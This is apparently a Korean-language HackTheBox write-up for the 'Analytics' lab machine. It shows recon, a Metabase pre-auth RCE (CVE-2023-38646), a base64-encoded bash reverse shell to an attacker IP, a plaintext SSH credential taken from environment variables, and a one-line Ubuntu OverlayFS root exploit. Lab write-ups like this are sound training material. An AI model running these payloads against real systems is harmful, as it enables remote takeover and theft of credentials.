# Analytics - HackTheBox
## Recon
```bash
sudo nmap -Pn -p 80 -sC -sV -vv -oA analytics 10.10.11.233
```
<img width="1106" height="288" alt="image" src="https://github.com/user-attachments/assets/0c6f3020-04e4-4463-8f76-a92f983256f0" />

- SSH(22)
- HTTP(80)

---
## HTTP
### banner grabbing
```bash
whatweb http://analytical.htb

curl -IL http://analytical.htb
```
<img width="1104" height="340" alt="image" src="https://github.com/user-attachments/assets/494f42bb-31cc-4b55-ab15-ef4754413282" />

<br>
<br>

- `/etc/hosts`에 `analytical.htb` 추가.
<img width="1104" height="64" alt="image" src="https://github.com/user-attachments/assets/7d448822-c559-493b-963a-9562c2ec57e2" />

<br>
<br>

- `login`탭을 클릭하니 `data.analytical.htb`연결 되어, `/etc/hosts`에 추가.
<img width="1103" height="65" alt="image" src="https://github.com/user-attachments/assets/ef972b1c-48d8-45fb-8044-e265eff9bf1d" />

<br>
<br>

- `metabase` 확인.
<img width="587" height="526" alt="image" src="https://github.com/user-attachments/assets/3e31171a-1cb6-49f9-8a46-0b3253dd74a5" />

<br>
<br>

- `burpsuite`의 `site map`에서 `/api`경로를 발견.
<img width="1100" height="350" alt="image" src="https://github.com/user-attachments/assets/5e428f53-5dfc-4443-888b-cb2a1a7bc0cd" />

<br>
<br>

- `/api/session/properties`에 접속하여 아래에서 버전 정보 발견.
<img width="587" height="262" alt="image" src="https://github.com/user-attachments/assets/b69fd1f2-9f0f-4024-aa6e-a8e3602eee81" />

### CVE-2023-38646
- https://nvd.nist.gov/vuln/detail/CVE-2023-38646
<img width="1211" height="411" alt="image" src="https://github.com/user-attachments/assets/1a57af21-025e-4de4-9f62-72a493b831d4" />

<br>
<br>

- https://github.com/m3m0o/metabase-pre-auth-rce-poc
- 페이로드를 생성하여 POST요청을 통해서 명령을 실행.
<img width="1100" height="552" alt="image" src="https://github.com/user-attachments/assets/c35737f0-92f4-4b9d-967e-94199bea49dc" />

<br>
<br>

- `proxy`를 설정해서 해당 페이로드가 어떻게 전달되는지 확인.
<img width="1105" height="45" alt="image" src="https://github.com/user-attachments/assets/2a94b349-989f-4ecd-8983-2eea168b0299" />
<img width="1105" height="45" alt="image" src="https://github.com/user-attachments/assets/82ebc4cf-ebc4-4143-81d8-2843207d4387" />

<br>
<br>

- ping test 시도.
```bash
python3 main.py --url http://data.analytical.htb -t '249fa03d-fd94-4d5b-b94f-b4ebf3df681f' -c 'ping 10.10.16.4'
```
<img width="1105" height="158" alt="image" src="https://github.com/user-attachments/assets/df773809-8a01-4f08-80ac-063403e904b3" />

<br>
<br>

- ping test 성공.
<img width="1103" height="305" alt="image" src="https://github.com/user-attachments/assets/1c513215-7f16-423e-bbbe-06151c8a592a" />

<br>
<br>

- 리버스 셸 코드 `base64` 인코딩.
```bash
echo -n 'bash  -i  >&/dev/tcp/10.10.16.4/80 0>&1'|base64 -w0
```
<img width="1103" height="86" alt="image" src="https://github.com/user-attachments/assets/bb12af88-2af9-47d0-bd37-e2aa45b983d4" />

<br>
<br>

- `burpsuite`에서 `base64`로 인코딩 된 부분을 교체하여 전달.
<img width="774" height="438" alt="image" src="https://github.com/user-attachments/assets/53790b56-e7fe-490c-a118-04cfc71f4de4" />

<br>
<br>

- 셸 획득.
<img width="1106" height="184" alt="image" src="https://github.com/user-attachments/assets/ffc770b2-5ad1-4e03-b2ba-31295d3176bb" />

---
## Privesc
- 환경변수를 확인하여 로그인 계정 획득.
```bash
env
```
<img width="1106" height="309" alt="image" src="https://github.com/user-attachments/assets/487acaa2-ddd0-424d-a486-8fa93e9c37c7" />

### SSH
- `metalytics:An4lytics_ds20223#` SSH 로그인.
```bash
ssh metalytics@10.10.11.233
```
<img width="1103" height="41" alt="image" src="https://github.com/user-attachments/assets/f0e91071-41d2-4580-8061-c2c907e4ed79" />

### OverlayFS exploit
- kernel `6.2.0-25-generic #25~22.04.2-Ubuntu`버전 확인.
```bash
uname -a
```
<img width="1103" height="59" alt="image" src="https://github.com/user-attachments/assets/6c9c81fb-d53b-4e52-a6a7-14cf1d0f8b8c" />

<br>
<br>

- https://www.wiz.io/blog/ubuntu-overlayfs-vulnerability
- 해당 버전에서 취약점 발견.
<img width="977" height="754" alt="image" src="https://github.com/user-attachments/assets/0b8a4727-2b40-436a-b6ef-3cba8a0dbaae" />

<br>
<br>

- https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/
- 해당 링크에 상세하게 설명이 되어있다.

<br>

- https://x.com/liadeliyahu/status/1684841527959273472
- 한줄로 exploit을 할 수 있는 코드.
<img width="716" height="514" alt="image" src="https://github.com/user-attachments/assets/92a9ca7c-f5c8-408b-8a2d-d3f6914f0f1c" />

<br>
<br>

- `root`셸 획득.
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```
<img width="1104" height="97" alt="image" src="https://github.com/user-attachments/assets/1cfeec74-a759-4164-b7b7-afab21268b2d" />

---
## FLAG
- `/home/metalytics/user.txt`
<img width="1104" height="327" alt="image" src="https://github.com/user-attachments/assets/85147692-8815-458a-9750-17aa6e0e4209" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="289" alt="image" src="https://github.com/user-attachments/assets/c403bca3-35bd-4e7c-a0c9-9cd2b507854e" />



















